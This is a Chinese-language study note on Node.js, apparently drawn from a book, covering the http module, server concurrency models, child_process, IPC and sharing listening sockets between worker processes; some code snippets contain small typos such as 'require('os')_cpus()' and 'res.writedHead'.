<h2 id="构建UDP服务（-暂略）"><a href="#构建UDP服务（-暂略）" class="headerlink" title="构建UDP服务（???暂略）"></a>构建UDP服务（???暂略）</h2><h2 id="构建HTTP服务-不全，暂略"><a href="#构建HTTP服务-不全，暂略" class="headerlink" title="构建HTTP服务(???不全，暂略)"></a>构建HTTP服务(???不全，暂略)</h2><h2 id="http模块"><a href="#http模块" class="headerlink" title="http模块"></a>http模块</h2><p>Node的http模块包含对HTTP处理的封装。在Node中,HTTP服务器继承自TCP服务器(net模块)，它能够与多个客户端保持连接，由于其采用事件驱动的形式，并不为每一个连接创建额外的线程或进程，保持很低的内存占用。所以能实现高并发。它和TCP服务模型有区别的地方在于，在开启keepalive后，一个TCP会话可以用于多次请求和响应。TCP服务以connection为单位进行服务，Http服务以request为单位进行服务。http模块即是将connection到request的过程进行了封装。<br><img src="https://mfaying.github.io/static/images/node/60.jpg" alt="avatar"></p>
<p>除此以外，http模块将连接所用套接字的读写抽象为ServerRequest和ServerResponse对象，它们分别对应请求和响应操作。在请求产生过程中，http模块拿到连接中传来的数据，调用二进制模块http_parse进行解析，在解析完请求报文的报头后，触发request事件，调用用户的业务逻辑。<br><img src="https://mfaying.github.io/static/images/node/61.jpg" alt="avatar"></p>
<p>1.HTTP请求</p>
<p>对于TCP连接的读操作，http模块将其封装为ServerRequest对象。报文头将会通过http_parser进行解析。</p>
<p>报文头第一行GET/ HTTP/1.1被解析之后分解为如下属性</p>
<ol>
<li>req.method属性</li>
<li>req.url 属性</li>
<li>req.httpVersion 属性</li>
</ol>
<p>其余报头是很规律的Key:Value格式，被解析后放置在req.headers属性上传递给业务逻辑以供调用<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">headers:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">'user-agent'</span>: <span class="string">'...'</span>,</span><br><span class="line">  host: <span class="string">'127.0.0.1:1337'</span>,</span><br><span class="line">  accept: <span class="string">'*/*'</span> &#125;,</span><br></pre></td></tr></table></figure></p>
<p>报文体部分则抽象为一个只读流对象，如果业务逻辑需要读取报文体中的数据，则要在这个数据流结束后才能进行操作<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> buffers = [];</span><br><span class="line">  req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">trunk</span>) </span>&#123;</span><br><span class="line">    buffers.push(trunk);</span><br><span class="line">  &#125;).on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> buffer = Buffer.concat(buffers);</span><br><span class="line">    <span class="comment">// TODO</span></span><br><span class="line">    res.end(<span class="string">'Helle world'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.HTTP响应</p>
<p>它封装了对底层连接的写操作，可以将其看成一个可写的流对象。它影响响应报文头部信息的API为res.setHeader()和res.writeHead()<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span>&#125;);</span><br></pre></td></tr></table></figure></p>
<p>我们可以调用setHeader进行多次设置，但只有调用writeHead后，报头才会写入到连接中，http模块还会自动帮你设置一些头信息<br><img src="https://mfaying.github.io/static/images/node/62.jpg" alt="avatar"></p>
<p>报文体部分则是调用res.write()和res.end()方法实现，res.end()会先调用write()发送数据，然后发送信号告知服务器这次响应结束。</p>
<p>响应结束后，HTTP服务器可能会将当前的连接用于下一个请求，或者关闭连接。值得注意的是，报文是在报文体发送前发送的，一旦开始了数据的发送，writeHead()或setHeader()将不再生效，这是由协议的特性决定的。</p>
<p>另外，务必在结束时调用res.end(),否则客户端将一直处于等待的状态。当然，也可以通过延迟res.end()的方式实现客户端与服务器端之间的长连接，但结束时务必关闭连接。</p>
<p>3.HTTP服务的事件</p>
<p><img src="https://mfaying.github.io/static/images/node/63.jpg" alt="avatar"></p>
<h2 id="HTTP客户端"><a href="#HTTP客户端" class="headerlink" title="HTTP客户端"></a>HTTP客户端</h2><p><img src="https://mfaying.github.io/static/images/node/64.jpg" alt="avatar"></p>
<p><img src="https://mfaying.github.io/static/images/node/65.jpg" alt="avatar"></p>
<p><img src="https://mfaying.github.io/static/images/node/66.jpg" alt="avatar"></p>
<p><img src="https://mfaying.github.io/static/images/node/67.jpg" alt="avatar"></p>
<h2 id="构建WebSocket服务-暂略"><a href="#构建WebSocket服务-暂略" class="headerlink" title="构建WebSocket服务(???暂略)"></a>构建WebSocket服务(???暂略)</h2><h2 id="网络服务与安全-暂略"><a href="#网络服务与安全-暂略" class="headerlink" title="网络服务与安全(???暂略)"></a>网络服务与安全(???暂略)</h2><h1 id="构建web应用-暂略"><a href="#构建web应用-暂略" class="headerlink" title="构建web应用(???暂略)"></a>构建web应用(???暂略)</h1><h1 id="玩转Node-js进程"><a href="#玩转Node-js进程" class="headerlink" title="玩转Node.js进程"></a>玩转Node.js进程</h1><p>Node在选型时决定在V8引擎之上构建，就意味着它的模型和浏览器类似，JavaScript是运行在单个进程的单个线程上。它带来的好处是：程序状态是单一的，在没有多线程的情况下没有锁、线程同步问题，操作系统在调度时也因为较少上下文的切换，可以很好地提高CPU的使用率。</p>
<p>但是一个Node进程只能利用一个核，无法充分利用多核CPU服务器。</p>
<p>另外,一旦单线程上抛出的异常没有被捕获，将会引起整个进程的崩溃。</p>
<p>从严格意义上而言，Node并非真正的单线程架构，它自身还有一定的I/O线程的存在，这些I/O线程由底层libuv处理。这部分线程，只有C++扩展开发时才会关注到。JavaScript代码永远运行在V8上，是单线程的。本章将围绕JavaScript部分展开，所以屏蔽底层细节的讨论。</p>
<h2 id="服务模型的变迁"><a href="#服务模型的变迁" class="headerlink" title="服务模型的变迁"></a>服务模型的变迁</h2><p>web服务器的架构经历了几次变迁。服务器处理客户端请求的并发量，就是每个里程碑的见证。</p>
<h2 id="石器时代：同步"><a href="#石器时代：同步" class="headerlink" title="石器时代：同步"></a>石器时代：同步</h2><p>一次只为一个请求服务，所有请求都得按次序等待服务器。假设每次响应服务耗用的时间稳定为N秒，这类服务的QPS为1/N。</p>
<h2 id="青铜时代：复制进程"><a href="#青铜时代：复制进程" class="headerlink" title="青铜时代：复制进程"></a>青铜时代：复制进程</h2><p>通过进程的复制同时服务更多的请求和用户。每个连接都需要一个进程来服务，这是非常昂贵的代价。在进程复制的过程中，需要复制进程内部的状态，相同的状态将会在内存中存在很多份，造成浪费。并且这个过程由于要复制较多的数据，启动是较为缓慢的。</p>
<p>所以预复制被引入服务模型中，即预先复制一定数量的进程。同时将进程复用，避免进程创建、销毁带来的开销。但是这个模型并不具备伸缩性，一旦并发请求过高，内存使用随着进程数的增长将会被耗尽。</p>
<p>假设通过进行复制和预复制的方式搭建的服务器有资源的限制，且进程数上限为M，那这类服务的QPS位M/N.</p>
<h2 id="白银时代：多线程"><a href="#白银时代：多线程" class="headerlink" title="白银时代：多线程"></a>白银时代：多线程</h2><p>为了解决进程复制中的浪费问题，多线程被引入服务模型，让一个线程服务一个请求。线程相对进程的开销要小许多，并且线程之间可以共享数据，内存浪费的问题可以得到解决，并且利用线程池可以减少创建和销毁线程的开销。但是多线程所面临的并发问题只能说比多进程略好，因为每个进程都拥有自己独立的堆栈，这个堆栈都需要占用一定的内存空间。另外，由于一个CPU核心在一个时刻只能做一件事，操作系统只能通过将CPU切分为时间片的方法，让线程可以较为均匀地使用CPU资源，但是操作系统内核在切换线程的同时也要切换线程的上线文，当线程数量过多时，时间将会被耗用在上下文切换中。所以在大并发量时，多线程结构还是无法做到强大的伸缩性。</p>
<p>如果忽略掉多线程上下文切换的开销，假设线程所占用的资源为进程的1/L,受资源上限的影响，它的QPS为M*L/N</p>
<h2 id="黄金时代：事件驱动"><a href="#黄金时代：事件驱动" class="headerlink" title="黄金时代：事件驱动"></a>黄金时代：事件驱动</h2><p>多线程的服务器模型服役了很长一段时间，Apache就是采用多线程/多进程模型实现的，当并发增长到上万时，内存耗用的问题将会暴露出来，即著名的C10k问题。</p>
<p>Node与Nginx则是基于事件驱动的服务模型实现的，采用单线程避免了不必要的内存开销和上下文切换开销。</p>
<p>基于事件驱动的服务模型存在前面提及的CPU利用率和进程健壮性的两个问题。</p>
<p>由于所有处理都是在单线程上进行，影响事件驱动服务模型性能的点在于CPU的计算能力，它的上限决定了这类服务模型的性能上限，但它不受多进程或多线程模式中资源上限的影响，可伸缩性远比前两者高。如果解决掉多核CPU的利用问题，带来的性能上提升是可观的。</p>
<h2 id="多进程架构"><a href="#多进程架构" class="headerlink" title="多进程架构"></a>多进程架构</h2><p>面对单进程单线程对多核CPU使用不足的问题，前人的经验是启用多进程即可。每个进程利用一个CPU，以此实现多核CPU的利用。Node提供了child_process模块，并且也提供了child_process.fork()函数供我们实现进程的复制。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// worker.js</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>:<span class="string">"text/plain"</span>&#125;);</span><br><span class="line">  res.end(<span class="string">'Hello World\n'</span>);</span><br><span class="line">&#125;).listen(<span class="built_in">Math</span>.round(<span class="number">1</span> + <span class="built_in">Math</span>.random()) * <span class="number">1000</span>, <span class="string">'127.0.0.1'</span>);</span><br></pre></td></tr></table></figure>
<p>通过 node mater.js启动它</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mater.js</span></span><br><span class="line"><span class="keyword">var</span> fork = <span class="built_in">require</span>(<span class="string">'child_process'</span>).fork;</span><br><span class="line"><span class="keyword">var</span> cpus = <span class="built_in">require</span>(<span class="string">'os'</span>)_cpus();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cpus.length; i++) &#123;</span><br><span class="line">  fork(<span class="string">'./worker.js'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是著名的Master-Workers模式，又称主从模式。这是典型的分布式架构中用来并行处理业务的模式，具备较好的可伸缩性和稳定性。主进程不负责具体的业务处理，而是负责调度或管理工作进程，它是趋于稳定的。工作进程负责具体的业务处理。</p>
<p><img src="https://mfaying.github.io/static/images/node/68.jpg" alt="avatar"></p>
<p>通过fork()复制的进程都是一个独立的进程，这个进程中有着独立而全新的V8实例。它需要至少30毫秒的启动时间和至少10MB的内存。fork()进程是昂贵的，好在Node通过事件驱动的方式在单线程上解决了大并发的问题，这里启动多个进程只是为了充分将CPU资源利用起来，而不是为了解决并发问题。</p>
<h2 id="创建子进程"><a href="#创建子进程" class="headerlink" title="创建子进程"></a>创建子进程</h2><p>child_process模块提供了4个方法用于创建子进程。</p>
<ol>
<li>spawn():启动一个子进程来执行命令</li>
<li>exec():启动一个子进程来执行命令，与spawn不同的是其接口不同，它有一个回调函数获知子进程的状况。</li>
<li>execFile():启动一个子进程来执行可执行文件</li>
<li>fork():与spawn类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。</li>
</ol>
<p>spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性设置超时时间，一但创建的进程运行超过设定的时间将会被杀死。</p>
<p>exec()和execFile()不同的是，exec()适合执行已有的命令，execFile()适合执行文件。</p>
<p>node worker.js分别用上述4种方法实现如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line">cp.spawn(<span class="string">'node'</span>, [<span class="string">'worker.js'</span>]);</span><br><span class="line">cp.exec(<span class="string">'node worker.js'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, stdout, stderr</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;);</span><br><span class="line">cp.execFile(<span class="string">'worker.js'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, stdout, stderr</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;);</span><br><span class="line">cp.fork(<span class="string">'./worker.js'</span>);</span><br></pre></td></tr></table></figure>
<p>以上4个方法在创建子进程之后均会返回子进程对象。</p>
<p>它们主要在是否有回调/异常、进程类型、执行类型、是否可设置超时上有差别。</p>
<p><img src="https://mfaying.github.io/static/images/node/69.jpg" alt="avatar"></p>
<p>这里的可执行文件是指可以直接执行的文件，如果是JavaScript文件通过execFile()运行，它的首行内容必须添加如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env node</span><br></pre></td></tr></table></figure>
<p>事实上其他三种方法都是spawn()的延伸。</p>
<h2 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h2><p>在Master-Worker模式中，要实现主进程管理和调度工作进程的功能，需要主进程和工作进程之间的通信。</p>
<p>和HTML5的WebWorker API一样，Node可以通过消息传递内容，而不是共享或直接操作相关资源，这是较为轻量和无依赖的做法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// parent.js</span></span><br><span class="line"><span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> n = cp.fork(__dirname + <span class="string">'/sub.js'</span>);</span><br><span class="line"></span><br><span class="line">n.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'PARENT get message:'</span>, m);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">n.send(&#123; <span class="attr">hello</span>: <span class="string">'world'</span> &#125;);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sub.js</span></span><br><span class="line">process.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'CHILD got message:'</span>, m);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">process.send(&#123; <span class="attr">foo</span>: <span class="string">'bar'</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>父进程与子进程之间将会创建IPC通道。通过IPC通道，父子进程之间才能通过message和send()传递消息。</p>
<h2 id="进程间通信原理"><a href="#进程间通信原理" class="headerlink" title="进程间通信原理"></a>进程间通信原理</h2><p>IPC的全称是Inter-Process Communication,即进程间通信。进程间通信的目的是为了让不同的进程能够互相访问资源并进行协调工作。Node中实现IPC通道的是管道（pipe）技术，但此管道非彼管道，在Node中管道是个抽象层面的称呼，具体细节实现由libuv提供，在Windows下由命名管道实现，*nix系统则采用Unix Domain Socket实现。表现在应用层上的进程间通信只有简单的message事件和send()方法。</p>
<p><img src="https://mfaying.github.io/static/images/node/70.jpg" alt="avatar"></p>
<p>父进程在创建子进程之前，会创建IPC通道并监听它，然后才真正创建出子进程，并通过环境变量（NODE_CHANNEL_FE）告诉子进程这个IPC通道的文件描述符。子进程在启动的过程中，根据文件描述符去连接这个已存在的IPC通道，从而完成父子进程之间的连接。</p>
<p><img src="https://mfaying.github.io/static/images/node/71.jpg" alt="avatar"></p>
<p>建立连接之后的父子进程就可以自由地通信了。由于IPC通道是用命名管道或Domain Socket创建的，它们与网路socket的行为比较类似，属于双向通信。不同的是它们在系统内核中就完成了进程间通信，而不用经过实际的网络层，非常高效。在Node中，IPC通道被抽象为Stream对象，在调用send()时发送数据（类似于write()）,接收到的消息会通过message事件（类似于data）触发给应用层。</p>
<h2 id="句柄传递"><a href="#句柄传递" class="headerlink" title="句柄传递"></a>句柄传递</h2><p>如果让服务器都监听到相同的端口会抛EADDRINUSE异常，这个问题破坏了我们将多个进程监听同一个端口的想法。通常的做法是让每个进程监听不同的端口，主进程监听主端口，主进程对外接收所有的网络请求，再将这些请求分别代理到不同端口的进程中。</p>
<p><img src="https://mfaying.github.io/static/images/node/72.jpg" alt="avatar"></p>
<p>在代理进程上可以做适当的负载均衡，使每个子进程可以较为均衡地执行任务。由于进程每收到一个连接，将会用掉一个文件描述符，因此代理方案中客户端连接到代理进程，代理进程连接到工作进程的过程需要用掉两个文件描述符。操作系统的文件描述符是有限的，这影响了系统的扩展能力。</p>
<p>Node在版本v0.5.9引入了进程间发送句柄的功能。send()方法除了能通过IPC发送数据外，还能发送句柄，第二个可选参数就是句柄：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">child.send(message, [sendHandle]);</span><br></pre></td></tr></table></figure>
<p>句柄是一种可以用来标识资源的引用，它的内部包含了指向对象的文件描述符。比如句柄可以用来标识一个服务器端socket对象、一个客户端socket对象、一个UDP套接字、一个管道等。</p>
<p>我们可以替换掉代理方法，主进程接收到socket请求后，将这个socket直接发送给工作进程，而不是重新与工作进程之间建立新的socket连接来转发数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> child = <span class="built_in">require</span>(<span class="string">'child_process'</span>).fork(<span class="string">'child.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'net'</span>).createServer();</span><br><span class="line">server.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  socket.end(<span class="string">'handled by parent'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">1337</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  child.send(<span class="string">'server'</span>, server);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>子进程</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">process.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m, server</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (m === <span class="string">'server'</span>) &#123;</span><br><span class="line">    server.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">      socket.end(<span class="string">'handled by child'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>示例中直接将一个TCP服务器发送给了子进程。</p>
<p>我们通过curl命令测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;http://127.0.0.1:1337/&quot;</span><br></pre></td></tr></table></figure>
<p>命令行响应结果是很不可思议的，这里子进程和父进程都有可能处理我们客户端发起的请求。</p>
<p>试试将服务发送给多个子进程：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// parent.js</span></span><br><span class="line"><span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> child1 = cp.fork(<span class="string">'child.js'</span>);</span><br><span class="line"><span class="keyword">var</span> child2 = cp.fork(<span class="string">'child.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'net'</span>).createServer();</span><br><span class="line">server.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  socket.end(<span class="string">'handle by parent\n'</span>)</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">1337</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  child1.send(<span class="string">'server'</span>, server);</span><br><span class="line">  child2.send(<span class="string">'server'</span>, server)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在子进程中将进程ID打印出来</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// child.js</span></span><br><span class="line">process.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m, server</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (m === <span class="string">'server'</span>) &#123;</span><br><span class="line">    server.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">      socket.end(<span class="string">'handle by child,pid is '</span> + process.pid + <span class="string">'\n'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>每次测试出现的结果都可能不同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">handle by child,pid is 24673</span><br><span class="line">handle by parent</span><br><span class="line">handle by child,pid is 24672</span><br></pre></td></tr></table></figure>
<p>这是在TCP层面上完成的事情，我们尝试将其转化到HTTP层面来试试。对于主进程，我们想让它更轻量一些，将服务器句柄发送给子进程之后，关掉服务器的监听，让子进程来处理请求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// parent.js</span></span><br><span class="line"><span class="keyword">var</span> cp = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> child1 = cp.fork(<span class="string">'child.js'</span>);</span><br><span class="line"><span class="keyword">var</span> child2 = cp.fork(<span class="string">'child.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">'net'</span>).createServer();</span><br><span class="line">server.listen(<span class="number">1337</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  child1.send(<span class="string">'server'</span>, server);</span><br><span class="line">  child2.send(<span class="string">'server'</span>, server);</span><br><span class="line">  server.close();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// child.js</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.writedHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);</span><br><span class="line">  res.end(<span class="string">"handled by child, pid is "</span> + process.pid + <span class="string">'\n'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">process.on(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">m, tcp</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (m === <span class="string">'server'</span>) &#123;</span><br><span class="line">    tcp.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">      server.emit(<span class="string">"connection"</span>, socket);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>测试结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">handle by child,pid is 24673</span><br><span class="line">handle by child,pid is 24672</span><br></pre></td></tr></table></figure>
<p>这样一来，所有的请求都是由子进程处理了。整个过程中，服务的过程只发生了一次改变。</p>
<p>先是主进程将请求发送给工作进程，主进程发送完句柄并关闭监听之后，多个子进程直接监听相同端口，并且不会抛EADDRINUSE异常。</p>
<h2 id="1-句柄发送与还原"><a href="#1-句柄发送与还原" class="headerlink" title="1.句柄发送与还原"></a>1.句柄发送与还原</h2><p>前面的句柄发送虽然看上去跟直接将服务器对象发送给子进程没有差别，但其实它并不是真的发送了服务器对象。</p>
<p>目前子进程对象send()方法可以发送的句柄类型包括如下几种</p>
<ol>
<li>net.Socket。TCP套接字</li>
<li>net.Server。 TCP服务器，任意建立在TCP服务上的应用层服务都可以享受到它带来的好处。</li>
<li>net.Native。C++层面的TCP套接字或IPC管道</li>
<li>dgram.Socket。UDP套接字。</li>
<li>dgram.Native。C++层面的UDP套接字。</li>
</ol>
<p>send()方法在将消息发送到IPC管道前，将消息组装成两个对象，一个参数是handle,另一个是message。message参数如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;cmd&quot;: &quot;NODE_HANDLE&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;net.Server&quot;,</span><br><span class="line">  &quot;msg&quot;: message</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发送到IPC管道中的实际上是我们要发送的句柄文件描述符，文件描述符实际上是一个整数值。这个message对象在写入到IPC管道时也会通过JSON.stringify()进行序列化。所以最终发送到IPC通道中的信息都是字符串，send()方法能发送消息和句柄并不意味着它能发送任意对象。</p>
<p>连接了IPC通道的子进程可以读取到父进程发来的消息，将字符串通过JSON.parse()解析还原为对象后，才触发message事件将消息体传递给应用层使用。在这个过程中，消息对象还要被进行过滤处理，message.cmd的值如果以NODE_为前缀，它将响应一个内部事件internalMessage。如果是NODE_HANDLE,它将取出message.type值和得到的文件描述符一起还原出一个对应的对象。</p>
<p><img src="https://mfaying.github.io/static/images/node/79.jpg" alt="avatar"></p>
<p>以发送的TCP服务器句柄为例，子进程收到消息后的还原过程如下所示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">message, handle, emit</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> server = <span class="keyword">new</span> net.Server();</span><br><span class="line">  server.listen(handle, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    emit(server);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>子进程根据message.type创建对应TCP服务对象，然后监听到文件描述符上。由于底层细节不被应用层感知，所以在子进程中，开发者会有一种服务器就是从父进程中直接传递过来的错觉。值得注意的是，Node进程之间只有消息传递，不会真正地传递对象，这种错觉就是抽象封装的结果。</p>
<p>除了上述提到的几种句柄，并非任意类型的句柄都能在进程之间传递，除非它有完整的发送和还原的过程。</p>
<h2 id="2-端口共同监听"><a href="#2-端口共同监听" class="headerlink" title="2.端口共同监听"></a>2.端口共同监听</h2><p>抛EADDRINUSE异常的原因，是我们独立启动的进程中，TCP服务器端socket套接字的文件描述符并不相同，导致监听到相同的端口时会抛异常。</p>
<p>Node底层对每个端口监听都设置了SO_REUSEADDR选项，含义是不同进程可以就相同的网卡和端口进行监听，这个服务器端套接字可以被不同进程复用,如下所示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">setsockopt(tcp-&gt;io_watcher.fd, SQL_SOCKET, SO_REUSEADDR, &amp;on, sizeof(on));</span><br></pre></td></tr></table></figure>
<p>由于独立启动的进程互相之间并不知道文件描述符，所以监听相同端口就会失败。但对于send()发送的句柄还原出来的服务而言，它们的文件描述符是相同的，所以监听相同端口不会引起异常。</p>
<p>多个应用监听相同端口时，文件描述符同一时间只能被某个进程所用。换言之就是网络请求向服务端发送时，只有一个幸运的进程能够抢到连接，也就是说只有它能为这个请求进程服务。这些进程服务是抢占式的。</p>
<p>通过这些基础技术，用child_process模块在单机上搭建Node集群是件相对容易的事情，因此在多核CPU的环境下，让Node进程能够充分利用资源不再是难题。</p>
<h1 id="集群稳定之路"><a href="#集群稳定之路" class="headerlink" title="集群稳定之路"></a>集群稳定之路</h1><p>搭建好了集群，可以充分利用多核CPU资源了。但是，我们还有一些细节需要考虑。</p>
<ol>
<li>性能问题</li>
<li>多个工作进程的存活状态管理</li>
<li>工作进程的平滑重启</li>
<li>配置或者静态数据的动态重新载入</li>
<li>其他细节</li>
</ol>
<p>虽然我们创建了很多工作进程，但每个工作进程依然是在单线程上执行的，它的稳定性还不能得到完全的保障。我们需要建立一个健全的机制来保障Node应用的健壮性。</p>
<h2 id="进程事件"><a href="#进程事件" class="headerlink" title="进程事件"></a>进程事件</h2><p>再次回到子进程对象上，除了send()方法和message事件，Node还有如下事件：</p>
<ol>
<li>error: 当子进程无法被复制创建、无法被杀死、无法发送消息时会触发</li>
<li>exit: 子进程退出时触发该事件，如果是正常退出，这个事件的第一个参数为退出码，否则为null。如果进程是通过kill()方法被杀死的，会得到第二个参数，它表示杀死进程时的信号。</li>
<li>close: 在子进程的标准输入输出流中止时触发该事件，参数与exit相同。</li>
<li>disconnect: 在父进程或子进程中调用disconnect()方法时触发该事件，在调用该方法时将关闭监听IPC通道。</li>
</ol>
<p>上述这些事件是父进程能监听到的与子进程相关的事件。除了send()外，还能通过kill()方法给子进程发送消息。kill()方法不能真正将通过IPC相连的子进程杀死，它只是给子进程发送了一个系统信号。默认情况下，父进程通过kill()方法给子进程发送一个SIGTERM信号。它与进程默认的kill()方法类似</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子进程</span></span><br><span class="line">child.kill([signal]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前进程</span></span><br><span class="line">process.kill(pid, [signal]);</span><br></pre></td></tr></table></figure>
<p>它们一个发给子进程，一个发给目标进程。在POSIX标准中，有一套完备的信号系统，在命令行中执行kill -l可以看到详细的信号列表。</p>
<p><img src="https://mfaying.github.io/static/images/node/80.jpg" alt="avatar"></p>
